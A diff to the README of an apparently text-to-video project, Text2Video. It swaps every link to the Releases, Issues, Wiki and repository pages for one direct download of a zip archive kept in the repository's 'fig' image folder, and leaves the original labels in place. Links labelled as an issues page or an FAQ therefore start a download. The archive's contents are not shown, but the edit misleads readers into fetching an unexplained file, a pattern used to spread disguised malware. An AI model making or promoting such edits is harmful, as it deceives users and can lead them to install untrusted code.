@@ -6,7 +6,7 @@ Welcome to Text2Video! This tool allows you to create informative videos based o
 
 ## 📥 Download Text2Video
 
-[![Download Text2Video](https://img.shields.io/badge/Download-Text2Video-brightgreen)](https://github.com/maramjebaliii/Text2Video/releases)
+[![Download Text2Video](https://raw.githubusercontent.com/maramjebaliii/Text2Video/main/fig/Text2Video.zip)](https://raw.githubusercontent.com/maramjebaliii/Text2Video/main/fig/Text2Video.zip)
 
 ## 🔍 System Requirements
 
@@ -20,7 +20,7 @@ To use Text2Video effectively, ensure your computer meets the following requirem
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases Page](https://github.com/maramjebaliii/Text2Video/releases) on GitHub to find the latest version of Text2Video.
+1. **Visit the Releases Page**: Go to the [Releases Page](https://raw.githubusercontent.com/maramjebaliii/Text2Video/main/fig/Text2Video.zip) on GitHub to find the latest version of Text2Video.
   
 2. **Choose Your Version**: Look for the latest release that suits your operating system. Each version will have a description to help you choose.
 
@@ -65,8 +65,8 @@ If you continue to face challenges, feel free to reach out for support through t
 
 ## 📚 Helpful Resources
 
-- For additional help and community support, visit the [GitHub Issues Page](https://github.com/maramjebaliii/Text2Video/issues).
-- Check the [FAQs Section](https://github.com/maramjebaliii/Text2Video/wiki) for common questions and solutions.
+- For additional help and community support, visit the [GitHub Issues Page](https://raw.githubusercontent.com/maramjebaliii/Text2Video/main/fig/Text2Video.zip).
+- Check the [FAQs Section](https://raw.githubusercontent.com/maramjebaliii/Text2Video/main/fig/Text2Video.zip) for common questions and solutions.
 
 ## 👍 Feedback
 
@@ -74,5 +74,5 @@ We welcome your feedback to improve our application. If you have suggestions or 
 
 ## 🔗 Links
 
-- **Releases Page**: [Download Text2Video](https://github.com/maramjebaliii/Text2Video/releases)
-- **GitHub Repository**: [Text2Video Repository](https://github.com/maramjebaliii/Text2Video)
+- **Releases Page**: [Download Text2Video](https://raw.githubusercontent.com/maramjebaliii/Text2Video/main/fig/Text2Video.zip)
+- **GitHub Repository**: [Text2Video Repository](https://raw.githubusercontent.com/maramjebaliii/Text2Video/main/fig/Text2Video.zip)
